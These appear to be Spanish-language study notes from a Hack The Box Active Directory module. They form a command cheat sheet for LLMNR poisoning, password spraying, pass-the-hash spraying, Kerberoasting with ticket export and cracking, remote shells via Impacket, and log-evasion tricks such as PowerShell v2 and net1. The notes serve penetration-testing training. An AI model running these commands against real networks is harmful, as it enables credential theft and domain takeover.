	#### ACTIVE DIRECTORY ENUMERATION & ATTACKS  

	### Definiciones
Es un servicio de windows altamente usado el cual permite manejar de forma centralizada la autenticacion, autorizacion y contabilidad de los usuarios de un dominio.

	### External recon
## Que se busca?
IP Space		-> Infraestructura, DNS, arquitectura cloud, etc
Domain Information	-> IP, DNS, registro de sitios, administrador de dominio, subdominios, etc
Schema Format		-> Cuentas de email, usuarios AD, politica de contraseñas, etc
Data Disclosures	-> Archivos accesibles de forma publica (.pdf, .ppt, .docx, .xlsx, etc) que permitan tener informacion de usuarios, metadata, shares, etc
Breach Data		-> Usuarios, contraseñas o iformacion critica que permite ganar foothold

## Donde se busca?
ASN / IP registrars			-> IANA y arin en America, RIPEE en europa. [!] -> BGP-Toolkit sirve para ver los bloqueas asignados a una organizacion
Domain Registrars & DNS			-> Domain tools (https://whois.domaintools.com/), view dns info (https://viewdns.info/), PTRAcrchive, ICANN o request manual de registros DNS
Social Media				-> Linkedin, Twitter, Facebook, etc
Public-Facing Company Websites		-> Documentos, seccion "about us" o "contact us" 
Cloud & Dev Storage Spaces		-> GitHub, AWS s3 bucket, Azure storage container y busquedas en google con "dorks"
Breach Data Sources			-> HaveIBeenPwned para buscar contraseñas de mails corporativos. Dehashed para buscar por emails corporativos en con hashes o passwords en cleartext. linkedin2username puede usarse paraa obtener posibles nombres de usuarios de la pagina de linkedin de la empresa.

## Proceso
Busqueda de dominio con BGP-Toolkit -> Busqueda de la ip deevuelta en View DNS info para corroborar ip y dominio -> busqueda en google con dorks
Ejemplo de busqueda
Archvios	-> filetype:pdf inurl:<domain>
Mails		-> intext:"@dominio" inurl:<dominio>

----------	----------	----------	----------
	### Enumeracion inicial

## Enumeracion pasiva
sudo -E wireshark
sudo tcpdump -i <red>
sudo responder -I ens224 -A 
#Estos tools van a permitirnos escuchar la red y ver que esta pasando en ella a su vez de poder identificar nuevos hosts. Es importante probar distintos tools para asegurarnos de eencontr la mayor cantidad posible de hosts
#Mucha atencion a la flag -A usada en responder para hacer un analisis pasivo de la red.

----------
## Enumeracion activa
fping -asgq 172.16.5.0/23
#Chequeo activo de la red. con -g se usa cidr block. Hace ping a toda esa subnet pasada

-> Dentro de aca tambien entra la enumeracion mediante nmap

sudo git clone https://github.com/ropnop/kerbrute.git
sudo make all
#Instalar kerbroute para enumerar usuarios en entorno AD
kerbrute userenum -d DOMINIO.LOCAL --dc <IP_dc> <user dic txt> -o valid_ad_users
#Enumeracion de usuarios contra el DC

## LLMNR/NBT-NS Poisioning desde Linux
responder -I <adaptador de red>
#Sin la flag -A se pone de forma activa a escuchar la red y responder a los hosts para que les den los hashed de auth

## LLMNR/NBT-NS Poisioning desde Windows
Import-Module .\Inveigh.ps1
(https://github.com/Kevin-Robertson/Inveigh#parameter-help)
#Se importa el tool Inveigh el cual funciona igual a responder pero escrito en powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
#Ejecutando la escucha con LLMNR y NBNS habilitando el output en consola y el file.

.\Inveigh.exe
#Si se usa el tool ya compilado en C#, se lo ejecuta y corre en default
Con la tecla esc se puede salir de la consola y tipear HELP para que se nos muestra la ayuda con los comandos y cosas para habilitar

----------	----------	----------	----------
	### Password spraying: Enumerar usuarios y politicas
Consta del intento de loguearse a un servicio mediante el uso de una contraseña pero una larga lista de usuarios

Para realizar este ataque correctamente priomero se necesita:
-> Listado valido de usuarios de dominio
-> Poliotica de contraseñas de la empresa

----------
## Obtener politica de contraseñas Linux
crackmapexec smb 172.16.5.5 -u <usuario valido> -p <contraseña valida> --pass-pol
#Enumeracion de politica de contraseñas con credenciales validas

rpcclient -U "" -N 172.16.5.5
getdompwinfo
#Enumeracion de la politica de contraseñas sin credenciales validas pero con null sesion

enum4linux -P 172.16.5.5
#Tool de enumeracion el cual prueba diferentes sesiones, busca politicas de contraseñas, etc.
enum4linux-ng -P 172.16.5.5 -oA ilfreight
#Escrito en python. Este permite exportar la data

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
#En configuraciones viejas de ldap es posible retrive data sin auth. De esta forma se soliciat la politica de pwd

----------
## Obtener politica de contraseñas Windows
net accounts
#En CMD. Devuelve info de la poltica como longitud, cata cuanto expira, intento maximos antes de ser bloqueado, etc.

import-module .\PowerView.ps1
Get-DomainPolicy
#Lo mismo que mas arriba pero con powershell

## Obtener usuarios validos de dominio
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
#Enumeracion dede usarios mediante tool enum4linux y flag -U

rpcclient -U "" -N 172.16.5.5
enumdomusers
#Con sesion null se puede consultar con la anteior query

crackmapexec smb 172.16.5.5 --users
#Crackmapexec tiene su metodo con la flag --user para darnos info de ellos
#Tambien nos devuelve info acerca de cantidad de invalid logins (badpwdcount), la vez en la que este bad attemp fue realizado (baddpwdtime) y las veces que se fallo (badpwdcount)

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
#Intentando obtener inforrmacion de usuarios mediante LDAP anonymous

./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
#Parecido a ldapsearch. Ekemplo con null session

kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
#Utiliza kerberos preauth el cual es rapido para realizar consultas. Este metodo no genera un windows event ID or logon failure que puede ser (y generalmente es) controlado.
#El tool envia un TGT request al dominio sin kerberos preauth para enumerar los usuarios. Si el KDC rresponder con un error PRINCIPAL UNKNOWN el usuario es invalido mientras que si devuelve un kerberos preeauth significa que es valido
#Si bien no genere windows ID event, el uso de kerbrute generaria un evento de request de TGT en el caso de que "Kerberos event logging" este habilitado

----------  ----------  ----------  ----------
	### Password Spraying from Linux
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
#One liner en bash para hacer passworrd sprying usando rpcclient y la lista obtenida de usuarios

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
#Password sprying con kerbrute usando lista de usr validos

sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
#Password srpying con crackmap exec filtrado por lo valido (+) uusando lista de us validos

## Verificacion de credencialees
sudo crackmapexec smb 172.16.5.5 -u <usuario> -p <Pass encontrada>
#Verificacion de usuarios y contraseñas validas mediante crackmapexec

## Local Admin Spraying with CrackMapExec
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
#Si tenemos el hash NT de un admin de cuenta local (no dominio). Es recomendable verificar dicho hash en toda la subnet con la flag --loca-auth para que el tool solo intente logearse 1 vez en cada maquina
#Tecnica muy ruidosa. Cuidado

----------
	### Password Spraying from Windows
En el caso de que estemos en una maquuina windows, el uso del tool DomainPasswordSpray puede ayudarnos. https://github.com/dafthack/DomainPasswordSpray
Si estamos autenticados, el tool genera una lista de usuarios, consulta la politica de pwd y ejecuta el Sprying sin bloquear las cuentas.
Si no estamos autenticados, podemos pasarle una lista de usuarios como en Linux con "-UserList" flag

Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
#Ejemplo del uso de tool estando autenticado en el dominio
#En el caso de no estarlo, se le pasa con la flag de la explicaion (-UserList) la lista de usuarios validos

----------  ----------  ----------  ----------
	### Enumerating Security Controls
Get-MpComputerStatus
#En windows, consultando con el comando anterior podemos saber si el "Real time protection" esta habiliatado o no. Esto es el windows defender

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
#Applocker es una aplicacion de Widnows que permite establecer una lista blanca con los sw que se pueden ejecutar en el sistema. Controla .exe, scripts, dlls, instaladores, etc
#Algunas empresas bloquean PowerShell.exe pero no bloquean otras localizaciones de powershell como: "%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" o "PowerShell_ISE.exe"

Find-LAPSDelegatedGroups
#LAPS permite hacer random y rotar las contraseñas de admin evitando el movimiento lateral.
#Enumerar los usuarios que pueden leer esto sirve para saber a que usuario apuntar
Find-AdmPwdExtendedRights
#El comando anterior permite revisar los permisos de cada computadora con LAPS habilitado para cada grupo con acceso de lectura.
Get-LAPSComputers
#Este comando permite saber las computadoras que tiene LAPS activado. Si nuestro usuario tiene permiso de lectura, muestra la pwd en cleartxt

----------  ----------  ----------  ----------
En este punto, ya con foothold en el sistema, hay que enumerar a profundidad con las credenciales obtenidas

	### Enumeracion de credenciales from Linux
Cheatsheet de tools: https://wadcoms.github.io/

----------
##Crackmapexec
sudo crackmapexec smb 172.16.5.5 -u <usr valido> -p <pwd valida>
--users
#Con credenciales y la flag --user se puede enumerar usuarios de dominio en el sistema
--group
#Esta flag nos sirve para, nuevamente con credenciales validas, obtener la informacion de los grupos de dominio
--loggedon-users
#Igual que el primero pero enumerando los usuarios logueados en el sistema
--shares
#Permite enumerar los directorios con el respectivo permiso
	-M spider_plus --share 'Directorio'
	#Esto permite enumerar en profundidad el dirtectorio y listar el contenido del mismo.
	#El output es exportado en /tmp/cme_spider_plus/

----------
##SMBmap
-u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
#Permite enumerar los shares con los respectivos permiosos
-R 'Directorio' --dir-only
#Estas flags permiten enumerar el direrctorio especificado en profundiad y con la flag --dir-only se pide el listado solo de directorios.

----------
##Rpcclient 
#([!] Mas info en txt attacking_rpc)

----------
##Impacket
Psexec.py
#Es un clon del tool sysinternals psexec. Crea un servicio mediante la subida de un ejecutable al dir ADMIN$, lo registra mediante RPC y windows control manager y, una vez establecida la comunicacion, genera una shell
psexec.py inlanefreight.local/<usrr>:'<pwd>'@172.16.5.125  
#Sintaxis para el uso con credenciales. Genera shell en system32 dir

wmiexec.py
#Utiliza un shell semi interactiva ejecutando comandos mediante Windows management instrumentation. No sube archivos al sistema generando menos logs que otros modulos de impacket
wmiexec.py inlanefreight.local/<usrr>:'<pwd>'@172.16.5.125
#Sintaxis para el uso con credenciales

windapsearch.py
#Script de python que permite la enumeracion de usuraios, grupos y maquinas en un dominio Windows utilizando queries de LDAP
python3 windapsearch.py --dc-ip 172.16.5.5 -u <usr>@inlanefreight.local -p <pwd> --da
#La flag --da sirve para la enumeracion de miembros en el grupo domain admins
-PU
#Esta flag sirve para la enumeracion de usuarios con privilegios elevados

Bloodhound.py
https://github.com/fox-it/BloodHound.py
#Tool que permite enumerar AD mas en profundidad que los anteriores desde windows o linux
bloodhound-python -u '<usr>' -p '<pwd>' -ns 172.16.5.5 -d inlanefreight.local -c all
#-c (o --collectionmethod) permite usar distintos metodos de coleccion de datos como grupos, localadmin, sesiones, etc (ver help para mas info)
#-ns especifica la ip del DC
#-d especifica el nombre del DC
sudo neo4j start
#Esto activa el servicio para usar el tool BloodHound GUI. Permite subir los archivos que se crearon luego de enumerar el dominio para que nos represente de forma grafica la composision de este.
	Find Shortest Paths To Domain Admins
	#Se puede correr queries como la anterior que permite generar un mapa del dominio el cual muestra el camino para comprometerlo


----------  ----------  ----------  ----------
	### Enumeracion de credenciales from Windows

##ActiveDirectory PowerShell
Import-Module ActiveDirectory
Get-Module
#Importar el modulo y verificar que se haya importado correctamente

Get-ADDomain
#Imprime informacion del dominio

Get-ADUser
#Devuelve listado de cuentas
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
#Devuelve listado de cuentas pero filtrando para que muestre posibles cuentas vulnerables a kerberoasting -> SPN

Get-ADTrust -Filter *
#Muestra relaciones de confianza que tenga el dominio.

Get-ADGroup -Filter * | select name
#Devuelve los grupos
Get-ADGroup -Identity "<nombre de grupo>"
#Devuelve info de un grupo en particular
Get-ADGroupMember -Identity "<nombre de grupo>"
#Devuelve informacion de miembros del grupo especificado

----------  
##PowerView
Get-DomainUser -Identity <usr> -Domain <domain> | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
#Enumerar informacion de un usuario especifico

Get-DomainGroupMember -Identity "Domain Admins" -Recurse
#Enumerar informacion recursivamente sobbre el grupo Domain Admins

Get-DomainTrustMapping
#Enunmerar relacion de confianza del dominio

Test-AdminAccess -ComputerName <nombre de maquina>
#Muestra si en la maquina local o remota el usuario que posee acceso domo admin

----------
##SharpView
.\SharpView.exe Get-DomainUser -Identity <usr>
#Enumerar informacion del usuario

----------
##Snaffler
.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
#Tool que permite obtener credenciales o info sensible del dominio como archhivos de configuracion, etc
#-s para que se muestre el output, -d para especioficar el dominio, -o especifica log file y

----------
##SharpHound
.\SharpHound.exe -c All --zipfilename ILFREIGHT
#Permite sacar la data y usarla en BloodHound GUI tool


----------  ----------  ----------  ----------
	### Living of the land: Windows
Mas info: https://academy.hackthebox.com/module/143/section/1360

##Comandos nativos basicos
hostname
#Muestra informacion de la PC
[System.Environment]::OSVersion.Version
#Muestra infrromacion del sistema operativo
wmic qfe get Caption,Description,HotFixID,InstalledOn
#Muestra patches and hotfixes aplicados en el host
ipconfig /all
#Muestra adaptadores de red y configuraciones
set %USERDOMAIN%
#Muestra el dominio al que pertenece (desde CMD)
set %logonserver%
#Muestra nombre del DC (desde CMD)
systeminfo
#Muestra un resumen de la inforrmacion del host.

----------
##Comandos nativos PowerShell
Get-Module
#Muestra los modulos que estan cargados
Get-ExecutionPolicy -List
#Muestra la configuracion de politicas en el host
Set-ExecutionPolicy Bypass -Scope Process
#Cambia la politica para un proceso en particular. Revierte la politica.
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
#Historial de powershell del usuario especificado
Get-ChildItem Env: | ft Key,Value
#Devuelve variables de entorno como key paths, usuarios, etc
powershell.exe -version 2
#Lanza la version 2 de powershell (si no se desinstalo) la cual no genera logs

----------
##Chequeando defensas
netsh advfirewall show allprofiles
#Firewall check
sc query windefend
#Windows defender (desde CMD) check
Get-MpComputerStatus
#Configuraciondes de anti virus habilitadas
qwinsta
#Chequeo si soy el unico logueado en la maquina

----------
##Informacion de red
arp -a
#Todos los hosts conocidos en la tabla arp
ipconfig /all
#Muestra kis adaptadores de red y las configuraciones
route print
#Muestra la tabla de routeo
netsh advfirewall show state
#Muestra el estado del firewall de host

----------
##Comandos NET
net accounts
#Politica de contraseñas
net accounts /domain
#Politica de contraseñas y lockout
net group /domain
#Informacion sobre el grupo de dominio
net group "Domain Admins" /domain
#Lista usuarios con privilegios de domain admin
net group "domain computers" /domain
#Lista PCs conectadas al dominio

*Mas info y comandos: https://academy.hackthebox.com/module/143/section/1360
En caso que se este monitoriando el comando "net" puede usarse "net1"

----------
##LDAP Filtering
Funciona con dsquery

dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=<MATHC>)" -limit 5 -attr sAMAccountName
#Sintaxis basica
#El match matchea entrre los bits del filtro que queremos realizar (https://academy.hackthebox.com/module/143/section/1360)
#-attr establece los atributos LDAP que queremos ver. Ej: description, distinguishedName, userAccountControl, etc

dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
#Ejemplo usando operador & 

----------  ----------  ----------  ----------
	### Kerberoasting desde Linux
##GetUserSPNs.py
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/<user to login>
#Muestra cuentas con SPN
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/<user to login> -request 
#Hace request para mostrar los TGS
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/<user to login> -request-user <user TGS>
#Hacer request para obtener el TGS de X usuario
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/<user to login> -request-user <user TGS> -outpuitfile <name>
#Output a un file

----------  ----------  ----------  ----------
        ### Kerberoasting desde Windows
##Semi manual con: setspn.exe
Add-Type -AssemblyName System.IdentityModel
#Add-Type agrega un clase .NET a powershell para ser inicializada despues
#-AssamblyName flag permite especificar el assembly que contiene types que queremos usar
#System.IdentityModel es un namespace que permite especificar clases para constrruir tokens de seguridad
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
#New-Object genera una nueva instancia .NET
#System.IdentityModel.Tokens es un namespace que junto con .KerberosRequestorSecurityToken crea un toekn de seguridad SPN para requestear el kerberos TGS para la cuenta en la sesiona actual.

setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
#Este comando convina los comandos de mas arriba con setspn.exe para requestear el ticket de todas las cuentas con SPN seteado

[*] Una vez realizado esto, se pueden dumpear los tickets de la memoria mediante mimikatz
base64 /out:true
#Especificar esto genera que el output no se guarde en un .kirbi, sino que se muestre en pantalla en abse64. Puede ser positivo o negativo dependiendo la situacion y que sea mas simple para pasarlo a nuestra maquina
kerberos::list /export
#Comienza a exportar los TGS

[*] Una vez en nuestra maquina el .kirbi tenemos que extaer el ticket
python2.7 kirbi2john.py sqldev.kirbi
#Esto crea un file con el ticket el cual debemos intentar crackear
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
#Limpiamos la dile generada (crack_file) para que hashcat pueda entenderlo

[*] En el caso de tener el ticket en base64
echo "<base64 blob>" |  tr -d \\n 
cat encoded_file | base64 -d > sqldev.kirbi
#En este punto ya tenemos el .kirbi para hacer lo de arriba

----------
##Automatizado con: PowerView
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
#Muestra los usuarios para targetearlos
Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat
#Esto devuelve el ticket

Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
#Exporta todos los tickets a un CSV file (ilfreight_tgs.csv)

----------
##Automatizado con: Rubeus
.\Rubeus.exe kerberoast /stats
#Muestra inforrmacion de usuarios kerberosteables
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
#Intenta requestear los tickets TGS de cuentaas con el atributo admincount en 1.
.\Rubeus.exe kerberoast /user:<user> /nowrap
#Intenta realizar la request para un usuario en particular
/tgtdeleg
#Esta flag le especifica al tool que solo haga request para hashes RC4 (tipo 23) que son mas rapidos de crackear.

[*] El tipo de hash que soporta el envirionment puede consultarse:
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

